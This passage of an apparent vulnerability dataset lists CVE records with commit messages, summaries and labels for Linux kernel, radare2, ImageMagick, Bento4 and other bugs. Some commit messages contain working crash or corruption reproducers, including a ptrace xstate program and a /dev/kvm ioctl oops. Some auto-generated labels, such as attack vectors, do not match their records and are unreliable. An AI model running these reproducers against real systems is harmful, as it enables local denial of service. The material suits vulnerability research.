However, on a buggy kernel running on a\nprocessor with the \"xsave\" feature but without the \"xsaves\" feature\n(e.g. Sandy Bridge through Broadwell for Intel), within a second or two\nthe program reports that the xmm registers were corrupted, i.e. were not\nrestored correctly.  With CONFIG_X86_DEBUG_FPU=y it also hits the above\nkernel warning.\n\n    #define _GNU_SOURCE\n    #include <stdbool.h>\n    #include <inttypes.h>\n    #include <linux\/elf.h>\n    #include <stdio.h>\n    #include <sys\/ptrace.h>\n    #include <sys\/uio.h>\n    #include <sys\/wait.h>\n    #include <unistd.h>\n\n    int main(void)\n    {\n        int pid = fork();\n        uint64_t xstate[512];\n        struct iovec iov = { .iov_base = xstate, .iov_len = sizeof(xstate) };\n\n        if (pid == 0) {\n            bool tracee = true;\n            for (int i = 0; i < sysconf(_SC_NPROCESSORS_ONLN) && tracee; i++)\n                tracee = (fork() != 0);\n            uint32_t xmm0[4] = { [0 ... 3] = tracee ? 0x00000000 : 0xDEADBEEF };\n            asm volatile(\"   movdqu %0, %%xmm0\\n\"\n                         \"   mov %0, %%rbx\\n\"\n                         \"1: movdqu %%xmm0, %0\\n\"\n                         \"   mov %0, %%rax\\n\"\n                         \"   cmp %%rax, %%rbx\\n\"\n                         \"   je 1b\\n\"\n                         : \"+m\" (xmm0) : : \"rax\", \"rbx\", \"xmm0\");\n            printf(\"BUG: xmm registers corrupted!  tracee=%d, xmm0=%08X%08X%08X%08X\\n\",\n                   tracee, xmm0[0], xmm0[1], xmm0[2], xmm0[3]);\n        } else {\n            usleep(100000);\n            ptrace(PTRACE_ATTACH, pid, 0, 0);\n            wait(NULL);\n            ptrace(PTRACE_GETREGSET, pid, NT_X86_XSTATE, &iov);\n            xstate[65] = -1;\n            ptrace(PTRACE_SETREGSET, pid, NT_X86_XSTATE, &iov);\n            ptrace(PTRACE_CONT, pid, 0, 0);\n            wait(NULL);\n        }\n        return 1;\n    }\n\nNote: the program only tests for the bug using the ptrace() system call.\nThe bug can also be reproduced using the rt_sigreturn() system call, but\nonly when called from a 32-bit program, since for 64-bit programs the\nkernel restores the FPU state from the signal frame by doing XRSTOR\ndirectly from userspace memory (with proper error checking).\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nReviewed-by: Kees Cook <keescook@chromium.org>\nReviewed-by: Rik van Riel <riel@redhat.com>\nAcked-by: Dave Hansen <dave.hansen@linux.intel.com>\nCc: <stable@vger.kernel.org> [v3.17+]\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Andy Lutomirski <luto@amacapital.net>\nCc: Andy Lutomirski <luto@kernel.org>\nCc: Borislav Petkov <bp@alien8.de>\nCc: Eric Biggers <ebiggers3@gmail.com>\nCc: Fenghua Yu <fenghua.yu@intel.com>\nCc: Kevin Hao <haokexin@gmail.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Michael Halcrow <mhalcrow@google.com>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: Wanpeng Li <wanpeng.li@hotmail.com>\nCc: Yu-cheng Yu <yu-cheng.yu@intel.com>\nCc: kernel-hardening@lists.openwall.com\nFixes: 0b29643a5843 (\"x86\/xsaves: Change compacted format xsave area header\")\nLink: http:\/\/lkml.kernel.org\/r\/20170922174156.16780-2-ebiggers3@gmail.com\nLink: http:\/\/lkml.kernel.org\/r\/20170923130016.21448-25-mingo@kernel.org\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"The x86\/fpu (Floating Point Unit) subsystem in the Linux kernel before 4.13.5, when a processor supports the xsave feature but not the xsaves feature, does not correctly handle attempts to set reserved bits in the xstate header via the ptrace() or rt_sigreturn() system call, allowing local users to read the FPU registers of other processes on the system, related to arch\/x86\/kernel\/fpu\/regset.c and arch\/x86\/kernel\/fpu\/signal.c.","commit_message_1":"do n't let userspace set bogus xcomp_bv on x86 , userspace can use the ptrace ( ) or rt_sigreturn ( ) system call to set a task 's extended state ( xstate ) or `` fpu '' register","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via the ptrace() or rt_sigreturn() system call","Impact":"obtain sensitive information","Root Cause":"does not correctly handle attempts to set reserved bits","Attack Type":"local attacker"},{"commit_id":"21a6f570ba33fa9f52f1bba87f07acc4e8c178f4","cve_id":"CVE-2017-15385","cwe_id":"CWE-119","commit_message":"Fix #8685 - Crash in ELF version parsing","summary":"The store_versioninfo_gnu_verdef function in libr\/bin\/format\/elf\/elf.c in radare2 2.0.0 allows remote attackers to cause a denial of service (r_read_le16 invalid write and application crash) or possibly have unspecified other impact via a crafted ELF file.","commit_message_1":"fix # <number> - crash in elf version parsing","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted elf file","Impact":"cause a denial of service ( r _ read _ le16 invalid write and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"52b1526443c1f433087928291d1c3d37a5600515","cve_id":"CVE-2017-15368","cwe_id":"CWE-125","commit_message":"Fix crash in wasm disassembler","summary":"The wasm_dis function in libr\/asm\/arch\/wasm\/wasm.c in radare2 2.0.0 allows remote attackers to cause a denial of service (stack-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted WASM file that triggers an incorrect r_hex_bin2str call.","commit_message_1":"fix crash in wasm disassembler","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted wasm file that triggers an incorrect r _ hex _ bin2str call","Impact":"cause a denial of service ( stack - based buffer over - read and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a stack-based buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"ac64115a66c18c01745bbd3c47a36b124e5fd8c0","cve_id":"CVE-2017-15306","cwe_id":"CWE-476","commit_message":"KVM: PPC: Fix oops when checking KVM_CAP_PPC_HTM\n\nThe following program causes a kernel oops:\n\n#include <sys\/types.h>\n#include <sys\/stat.h>\n#include <fcntl.h>\n#include <sys\/ioctl.h>\n#include <linux\/kvm.h>\n\nmain()\n{\n    int fd = open(\"\/dev\/kvm\", O_RDWR);\n    ioctl(fd, KVM_CHECK_EXTENSION, KVM_CAP_PPC_HTM);\n}\n\nThis happens because when using the global KVM fd with\nKVM_CHECK_EXTENSION, kvm_vm_ioctl_check_extension() gets\ncalled with a NULL kvm argument, which gets dereferenced\nin is_kvmppc_hv_enabled(). Spotted while reading the code.\n\nLet's use the hv_enabled fallback variable, like everywhere\nelse in this function.\n\nFixes: 23528bb21ee2 (\"KVM: PPC: Introduce KVM_CAP_PPC_HTM\")\nCc: stable@vger.kernel.org # v4.7+\nSigned-off-by: Greg Kurz <groug@kaod.org>\nReviewed-by: David Gibson <david@gibson.dropbear.id.au>\nReviewed-by: Thomas Huth <thuth@redhat.com>\nSigned-off-by: Paul Mackerras <paulus@ozlabs.org>","summary":"The kvm_vm_ioctl_check_extension function in arch\/powerpc\/kvm\/powerpc.c in the Linux kernel before 4.13.11 allows local users to cause a denial of service (NULL pointer dereference and system crash) via a KVM_CHECK_EXTENSION KVM_CAP_PPC_HTM ioctl call to \/dev\/kvm.","commit_message_1":"ppc : fix oops when checking kvm_cap_ppc_htm the following program cause a kernel oops : # include < sys\/<file> > # include < sys\/<file> > # include < <file> > # include < sys\/<file> > # include < linux\/<file> > main ( ) { int fd = open ( `` \/dev\/kvm '' , o_rdwr ) ; ioctl ( fd , kvm_check_extension , kvm_cap_ppc_htm ) ; } this happens because when using the global kvm fd with kvm_check_extension , kvm_vm_ioctl_check_extension ( ) get called with a null kvm argument , which get dereferenced in is_kvmppc_hv_enabled ( )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a kvm _ check _ extension kvm _ cap _ ppc _ htm ioctl call to \/ dev \/ kvm","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"9fd10cf630832b36a588c1545d8736539b2f1fb5","cve_id":"CVE-2017-15277","cwe_id":"CWE-200","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/592","summary":"ReadGIFImage in coders\/gif.c in ImageMagick 7.0.6-1 and GraphicsMagick 1.3.26 leaves the palette uninitialized when processing a GIF file that has neither a global nor local palette. If the affected product is used as a library loaded into a process that operates on interesting data, this data sometimes can be leaked via the uninitialized palette.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"71105998845fb012937332fe2e806d443c09e026","cve_id":"CVE-2017-15265","cwe_id":"CWE-416","commit_message":"ALSA: seq: Fix use-after-free at creating a port\n\nThere is a potential race window opened at creating and deleting a\nport via ioctl, as spotted by fuzzing.  snd_seq_create_port() creates\na port object and returns its pointer, but it doesn't take the\nrefcount, thus it can be deleted immediately by another thread.\nMeanwhile, snd_seq_ioctl_create_port() still calls the function\nsnd_seq_system_client_ev_port_start() with the created port object\nthat is being deleted, and this triggers use-after-free like:\n\n BUG: KASAN: use-after-free in snd_seq_ioctl_create_port+0x504\/0x630 [snd_seq] at addr ffff8801f2241cb1\n =============================================================================\n BUG kmalloc-512 (Tainted: G    B          ): kasan: bad access detected\n -----------------------------------------------------------------------------\n INFO: Allocated in snd_seq_create_port+0x94\/0x9b0 [snd_seq] age=1 cpu=3 pid=4511\n \t___slab_alloc+0x425\/0x460\n \t__slab_alloc+0x20\/0x40\n  \tkmem_cache_alloc_trace+0x150\/0x190\n\tsnd_seq_create_port+0x94\/0x9b0 [snd_seq]\n\tsnd_seq_ioctl_create_port+0xd1\/0x630 [snd_seq]\n \tsnd_seq_do_ioctl+0x11c\/0x190 [snd_seq]\n \tsnd_seq_ioctl+0x40\/0x80 [snd_seq]\n \tdo_vfs_ioctl+0x54b\/0xda0\n \tSyS_ioctl+0x79\/0x90\n \tentry_SYSCALL_64_fastpath+0x16\/0x75\n INFO: Freed in port_delete+0x136\/0x1a0 [snd_seq] age=1 cpu=2 pid=4717\n \t__slab_free+0x204\/0x310\n \tkfree+0x15f\/0x180\n \tport_delete+0x136\/0x1a0 [snd_seq]\n \tsnd_seq_delete_port+0x235\/0x350 [snd_seq]\n \tsnd_seq_ioctl_delete_port+0xc8\/0x180 [snd_seq]\n \tsnd_seq_do_ioctl+0x11c\/0x190 [snd_seq]\n \tsnd_seq_ioctl+0x40\/0x80 [snd_seq]\n \tdo_vfs_ioctl+0x54b\/0xda0\n \tSyS_ioctl+0x79\/0x90\n \tentry_SYSCALL_64_fastpath+0x16\/0x75\n Call Trace:\n  [<ffffffff81b03781>] dump_stack+0x63\/0x82\n  [<ffffffff81531b3b>] print_trailer+0xfb\/0x160\n  [<ffffffff81536db4>] object_err+0x34\/0x40\n  [<ffffffff815392d3>] kasan_report.part.2+0x223\/0x520\n  [<ffffffffa07aadf4>] ? snd_seq_ioctl_create_port+0x504\/0x630 [snd_seq]\n  [<ffffffff815395fe>] __asan_report_load1_noabort+0x2e\/0x30\n  [<ffffffffa07aadf4>] snd_seq_ioctl_create_port+0x504\/0x630 [snd_seq]\n  [<ffffffffa07aa8f0>] ? snd_seq_ioctl_delete_port+0x180\/0x180 [snd_seq]\n  [<ffffffff8136be50>] ? taskstats_exit+0xbc0\/0xbc0\n  [<ffffffffa07abc5c>] snd_seq_do_ioctl+0x11c\/0x190 [snd_seq]\n  [<ffffffffa07abd10>] snd_seq_ioctl+0x40\/0x80 [snd_seq]\n  [<ffffffff8136d433>] ? acct_account_cputime+0x63\/0x80\n  [<ffffffff815b515b>] do_vfs_ioctl+0x54b\/0xda0\n  .....\n\nWe may fix this in a few different ways, and in this patch, it's fixed\nsimply by taking the refcount properly at snd_seq_create_port() and\nletting the caller unref the object after use.  Also, there is another\npotential use-after-free by sprintf() call in snd_seq_create_port(),\nand this is moved inside the lock.\n\nThis fix covers CVE-2017-15265.\n\nReported-and-tested-by: Michael23 Yu <ycqzsy@gmail.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Race condition in the ALSA subsystem in the Linux kernel before 4.13.8 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via crafted \/dev\/snd\/seq ioctl calls, related to sound\/core\/seq\/seq_clientmgr.c and sound\/core\/seq\/seq_ports.c.","commit_message_1":"seq : fix use-after-free at creating a port there is a potential race window opened at creating and deleting a port via ioctl , a spotted by fuzzing","Vulnerability Type":"Use After Free","Attack Vector":"via crafted \/ dev \/ snd \/ seq ioctl calls , related to sound \/ core \/ seq \/ seq _ clientmgr . c and sound \/ core \/ seq \/ seq _ ports . c","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free memory error","Attack Type":"local attacker"},{"commit_id":"94f1bb15bed84ad6c893916b7e7b9db6f1d7eec6","cve_id":"CVE-2017-15116","cwe_id":"CWE-476","commit_message":"crypto: rng - Remove old low-level rng interface\n\nNow that all rng implementations have switched over to the new\ninterface, we can remove the old low-level interface.\n\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The rngapi_reset function in crypto\/rng.c in the Linux kernel before 4.2 allows attackers to cause a denial of service (NULL pointer dereference).","commit_message_1":"rng - remove old low-level rng interface now that all rng implementation have switched over to the new interface , we can remove the old low-level interface","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially-crafted packet","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"df80cd9b28b9ebaa284a41df611dbf3a2d05ca74","cve_id":"CVE-2017-15115","cwe_id":"CWE-416","commit_message":"sctp: do not peel off an assoc from one netns to another one\n\nNow when peeling off an association to the sock in another netns, all\ntransports in this assoc are not to be rehashed and keep use the old\nkey in hashtable.\n\nAs a transport uses sk->net as the hash key to insert into hashtable,\nit would miss removing these transports from hashtable due to the new\nnetns when closing the sock and all transports are being freeed, then\nlater an use-after-free issue could be caused when looking up an asoc\nand dereferencing those transports.\n\nThis is a very old issue since very beginning, ChunYu found it with\nsyzkaller fuzz testing with this series:\n\n  socket$inet6_sctp()\n  bind$inet6()\n  sendto$inet6()\n  unshare(0x40000000)\n  getsockopt$inet_sctp6_SCTP_GET_ASSOC_ID_LIST()\n  getsockopt$inet_sctp6_SCTP_SOCKOPT_PEELOFF()\n\nThis patch is to block this call when peeling one assoc off from one\nnetns to another one, so that the netns of all transport would not\ngo out-sync with the key in hashtable.\n\nNote that this patch didn't fix it by rehashing transports, as it's\ndifficult to handle the situation when the tuple is already in use\nin the new netns. Besides, no one would like to peel off one assoc\nto another netns, considering ipaddrs, ifaces, etc. are usually\ndifferent.\n\nReported-by: ChunYu Wang <chunwang@redhat.com>\nSigned-off-by: Xin Long <lucien.xin@gmail.com>\nAcked-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>\nAcked-by: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_do_peeloff function in net\/sctp\/socket.c in the Linux kernel before 4.14 does not check whether the intended netns is used in a peel-off action, which allows local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via crafted system calls.","commit_message_1":"do not peel off an assoc from one netns to another one now when peeling off an association to the sock in another netns , all transport in this assoc are not to be rehashed and keep use the old key in hashtable","Vulnerability Type":"Use After Free","Attack Vector":"via crafted system calls","Impact":"cause a denial of service ( use - after - free and system crash ) or possibly have unspecified other impact","Root Cause":"does not check whether the intended netns is used","Attack Type":"local attacker"},{"commit_id":"2fae9e5a7babada041e2e161699ade2447a01989","cve_id":"CVE-2017-15102","cwe_id":"CWE-476","commit_message":"usb: misc: legousbtower: Fix NULL pointer deference\n\nThis patch fixes a NULL pointer dereference caused by a race codition in\nthe probe function of the legousbtower driver. It re-structures the\nprobe function to only register the interface after successfully reading\nthe board's firmware ID.\n\nThe probe function does not deregister the usb interface after an error\nreceiving the devices firmware ID. The device file registered\n(\/dev\/usb\/legousbtower%d) may be read\/written globally before the probe\nfunction returns. When tower_delete is called in the probe function\n(after an r\/w has been initiated), core dev structures are deleted while\nthe file operation functions are still running. If the 0 address is\nmappable on the machine, this vulnerability can be used to create a\nLocal Priviege Escalation exploit via a write-what-where condition by\nremapping dev->interrupt_out_buffer in tower_write. A forged USB device\nand local program execution would be required for LPE. The USB device\nwould have to delay the control message in tower_probe and accept\nthe control urb in tower_open whilst guest code initiated a write to the\ndevice file as tower_delete is called from the error in tower_probe.\n\nThis bug has existed since 2003. Patch tested by emulated device.\n\nReported-by: James Patrick-Evans <james@jmp-e.com>\nTested-by: James Patrick-Evans <james@jmp-e.com>\nSigned-off-by: James Patrick-Evans <james@jmp-e.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The tower_probe function in drivers\/usb\/misc\/legousbtower.c in the Linux kernel before 4.8.1 allows local users (who are physically proximate for inserting a crafted USB device) to gain privileges by leveraging a write-what-where condition that occurs after a race condition and a NULL pointer dereference.","commit_message_1":"misc : legousbtower : fix null pointer deference this patch fix a null pointer dereference caused by a race codition in the probe function of the legousbtower driver","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by leveraging a write - what - where condition that occurs after a race condition and a pointer dereference","Impact":"gain privileges","Root Cause":"caused by a race condition and a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"fbb687db1088ddd894d975996e5f6a4252b9a2b4","cve_id":"CVE-2017-15088","cwe_id":"CWE-119","commit_message":"Fix PKINIT cert matching data construction\n\nRewrite X509_NAME_oneline_ex() and its call sites to use dynamic\nallocation and to perform proper error checking.\n\nticket: 8617\ntarget_version: 1.16\ntarget_version: 1.15-next\ntarget_version: 1.14-next\ntags: pullup","summary":"plugins\/preauth\/pkinit\/pkinit_crypto_openssl.c in MIT Kerberos 5 (aka krb5) through 1.15.2 mishandles Distinguished Name (DN) fields, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow and application crash) in situations involving untrusted X.509 data, related to the get_matching_data and X509_NAME_oneline_ex functions. NOTE: this has security relevance only in use cases outside of the MIT Kerberos distribution, e.g., the use of get_matching_data in KDC certauth plugin code that is specific to Red Hat.","commit_message_1":"fix pkinit cert matching data construction rewrite x509_name_oneline_ex ( ) and it call site to use dynamic allocation and to perform proper error checking","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary code or cause a denial of service ( buffer overflow and application crash ) in situations involving untrusted x . 509 data , related to the get _ matching _","Root Cause":"caused by improper bounds checking by the Distinguished Name (DN) fields","Attack Type":"remote attacker"},{"commit_id":"ef8f40689ac452398026c07da41656a7c87e4683","cve_id":"CVE-2017-15033","cwe_id":"CWE-772","commit_message":"fix multiple memory leak in ReadYUVImage","summary":"ImageMagick version 7.0.7-2 contains a memory leak in ReadYUVImage in coders\/yuv.c.","commit_message_1":"fix multiple memory leak in readyuvimage","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak issue","Attack Type":"remote attacker"},{"commit_id":"241988ca28139ad970c1d9717c419f41e360ddb0","cve_id":"CVE-2017-15032","cwe_id":"CWE-772","commit_message":"fix memory leak in ReadYCBCRImage as SetImageExtent failure","summary":"ImageMagick version 7.0.7-2 contains a memory leak in ReadYCBCRImage in coders\/ycbcr.c.","commit_message_1":"fix memory leak in readycbcrimage a setimageextent failure","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak issue","Attack Type":"remote attacker"},{"commit_id":"3e0097499839e0fe3af380410eababe5a47c4cf9","cve_id":"CVE-2017-14991","cwe_id":"CWE-200","commit_message":"scsi: sg: fixup infoleak when using SG_GET_REQUEST_TABLE\n\nWhen calling SG_GET_REQUEST_TABLE ioctl only a half-filled table is\nreturned; the remaining part will then contain stale kernel memory\ninformation.  This patch zeroes out the entire table to avoid this\nissue.\n\nSigned-off-by: Hannes Reinecke <hare@suse.com>\nReviewed-by: Bart Van Assche <bart.vanassche@wdc.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nReviewed-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"The sg_ioctl function in drivers\/scsi\/sg.c in the Linux kernel before 4.13.4 allows local users to obtain sensitive information from uninitialized kernel heap-memory locations via an SG_GET_REQUEST_TABLE ioctl call for \/dev\/sg0.","commit_message_1":"sg : fixup infoleak when using sg_get_request_table when calling sg_get_request_table ioctl only a half-filled table is returned ; the remaining part will then contain stale kernel memory information","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via an sg _ get _ request _ table ioctl call for \/ dev \/ sg0","Impact":"obtain sensitive information from uninitialized kernel heap - memory locations","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"6c85501f2fabcfc4fc6ed976543d252c4eaf4be9","cve_id":"CVE-2017-14954","cwe_id":"CWE-200","commit_message":"fix infoleak in waitid(2)\n\nkernel_waitid() can return a PID, an error or 0.  rusage is filled in the first\ncase and waitid(2) rusage should've been copied out exactly in that case, *not*\nwhenever kernel_waitid() has not returned an error.  Compat variant shares that\nbraino; none of kernel_wait4() callers do, so the below ought to fix it.\n\nReported-and-tested-by: Alexander Potapenko <glider@google.com>\nFixes: ce72a16fa705 (\"wait4(2)\/waitid(2): separate copying rusage to userland\")\nCc: stable@vger.kernel.org # v4.13\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The waitid implementation in kernel\/exit.c in the Linux kernel through 4.13.4 accesses rusage data structures in unintended cases, which allows local users to obtain sensitive information, and bypass the KASLR protection mechanism, via a crafted system call.","commit_message_1":"fix infoleak in waitid ( <number> ) kernel_waitid ( ) can return a pid , an error or <number>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted system call","Impact":"obtain sensitive information , and bypass the kaslr protection mechanism ","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"c42a1388a6d1bfd8001bf6a4241d8ca27e49326d","cve_id":"CVE-2017-14767","cwe_id":"CWE-119","commit_message":"avformat\/rtpdec_h264: Fix heap-buffer-overflow\n\nFixes: rtp_sdp\/poc.sdp\n\nFound-by: Bingchang <l.bing.chang.bc@gmail.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The sdp_parse_fmtp_config_h264 function in libavformat\/rtpdec_h264.c in FFmpeg before 3.3.4 mishandles empty sprop-parameter-sets values, which allows remote attackers to cause a denial of service (heap buffer overflow) or possibly have unspecified other impact via a crafted sdp file.","commit_message_1":"avformat\/rtpdec_h264 : fix heap-buffer-overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted sdp file","Impact":"cause a denial of service ( heap buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"f105c6f0b56fb5687b2d2aedf37cb1d1b434d556","cve_id":"CVE-2017-14727","cwe_id":"CWE-119","commit_message":"logger: call strftime before replacing buffer local variables","summary":"logger.c in the logger plugin in WeeChat before 1.9.1 allows a crash via strftime date\/time specifiers, because a buffer is not initialized.","commit_message_1":"logger : call strftime before replacing buffer local variable","Vulnerability Type":"buffer overflow","Attack Vector":"By using specially-crafted strftime date\/time specifiers","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"53499d8d4c69142137c7c7f0097a444783fdeb90","cve_id":"CVE-2017-14646","cwe_id":"CWE-125","commit_message":"fix for #188","summary":"The AP4_AvccAtom and AP4_HvccAtom classes in Bento4 version 1.5.0-617 do not properly validate data sizes, leading to a heap-based buffer over-read and application crash in AP4_DataBuffer::SetData in Core\/Ap4DataBuffer.cpp.","commit_message_1":"fix for # <number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"do not properly validate data sizes , leading to a heap - based buffer over - read and application crash","Attack Type":"remote attacker"},{"commit_id":"5eb8cf89d724ccb0b4ce5f24171ec7c11f0a7647","cve_id":"CVE-2017-14643","cwe_id":"CWE-125","commit_message":"fix for #187","summary":"The AP4_HdlrAtom class in Core\/Ap4HdlrAtom.cpp in Bento4 version 1.5.0-617 uses an incorrect character data type, leading to a heap-based buffer over-read and application crash in AP4_BytesToUInt32BE in Core\/Ap4Utils.h.","commit_message_1":"fix for # <number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"22192de5367fa0cee985917f092be4060b7c00b0","cve_id":"CVE-2017-14642","cwe_id":"CWE-476","commit_message":"fix for #185","summary":"A NULL pointer dereference was discovered in the AP4_HdlrAtom class in Bento4 version 1.5.0-617. The vulnerability causes a segmentation fault and application crash in AP4_StdcFileByteStream::ReadPartial in System\/StdC\/Ap4StdCFileByteStream.cpp, which leads to remote denial of service.","commit_message_1":"fix for # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"none","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"41cad602709436628f07b4c4f64e9ff7a611f687","cve_id":"CVE-2017-14641","cwe_id":"CWE-476","commit_message":"fix for #184","summary":"A NULL pointer dereference was discovered in the AP4_DataAtom class in MetaData\/Ap4MetaData.cpp in Bento4 version 1.5.0-617. The vulnerability causes a segmentation fault and application crash, which leads to remote denial of service.","commit_message_1":"fix for # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"none","Impact":"causes a segmentation fault and application crash","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"2f267f89f957088197f4b1fc254632d1645b415d","cve_id":"CVE-2017-14640","cwe_id":"CWE-476","commit_message":"fix for #183","summary":"A NULL pointer dereference was discovered in AP4_AtomSampleTable::GetSample in Core\/Ap4AtomSampleTable.cpp in Bento4 version 1.5.0-617. The vulnerability causes a segmentation fault and application crash, which leads to remote denial of service.","commit_message_1":"fix for # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"A NULL pointer dereference was discovered in AP4_AtomSampleTable::GetSample","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"03d1222ab9c2ce779cdf01bdb96cdd69cbdcfeda","cve_id":"CVE-2017-14639","cwe_id":"CWE-843","commit_message":"fix for #190","summary":"AP4_VisualSampleEntry::ReadFields in Core\/Ap4SampleEntry.cpp in Bento4 1.5.0-617 uses incorrect character data types, which causes a stack-based buffer underflow and out-of-bounds write, leading to denial of service (application crash) or possibly unspecified other impact.","commit_message_1":"fix for # <number>","Vulnerability Type":"Type Confusion","Attack Vector":"by persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer underflow and out-of-bounds write flaw","Attack Type":"remote attacker"},{"commit_id":"be7185faf7f52674028977dcf501c6039ff03aa5","cve_id":"CVE-2017-14638","cwe_id":"CWE-476","commit_message":"fix for #182","summary":"AP4_AtomFactory::CreateAtomFromStream in Core\/Ap4AtomFactory.cpp in Bento4 version 1.5.0-617 has missing NULL checks, leading to a NULL pointer dereference, segmentation fault, and application crash in AP4_Atom::SetType in Core\/Ap4Atom.h.","commit_message_1":"fix for # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"d13e8f6d1e987b7491182040a188c16a395f1d21","cve_id":"CVE-2017-14608","cwe_id":"CWE-125","commit_message":"CVE-2017-1438 credits; fix for Kodak 65000 out of bounds access","summary":"In LibRaw through 0.18.4, an out of bounds read flaw related to kodak_65000_load_raw has been reported in dcraw\/dcraw.c and internal\/dcraw_common.cpp. An attacker could possibly exploit this flaw to disclose potentially sensitive memory or cause an application crash.","commit_message_1":"<cve_id> credit ; fix for kodak <number> out of bound access","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"obtain sensitive information","Root Cause":"has been reported","Attack Type":"remote attacker"},{"commit_id":"1630f53481f445ada0a455e9979236d31a8d3bb0","cve_id":"CVE-2017-14604","cwe_id":"CWE-20","commit_message":"mime-actions: use file metadata for trusting desktop files\n\nCurrently we only trust desktop files that have the executable bit\nset, and don't replace the displayed icon or the displayed name until\nit's trusted, which prevents for running random programs by a malicious\ndesktop file.\n\nHowever, the executable permission is preserved if the desktop file\ncomes from a compressed file.\n\nTo prevent this, add a metadata::trusted metadata to the file once the\nuser acknowledges the file as trusted. This adds metadata to the file,\nwhich cannot be added unless it has access to the computer.\n\nAlso remove the SHEBANG \"trusted\" content we were putting inside the\ndesktop file, since that doesn't add more security since it can come\nwith the file itself.\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=777991","summary":"GNOME Nautilus before 3.23.90 allows attackers to spoof a file type by using the .desktop file extension, as demonstrated by an attack in which a .desktop file's Name field ends in .pdf but this file's Exec field launches a malicious *sh -c* command. In other words, Nautilus provides no UI indication that a file actually has the potentially unsafe .desktop extension; instead, the UI only shows the .pdf extension. One (slightly) mitigating factor is that an attack requires the .desktop file to have execute permission. The solution is to ask the user to confirm 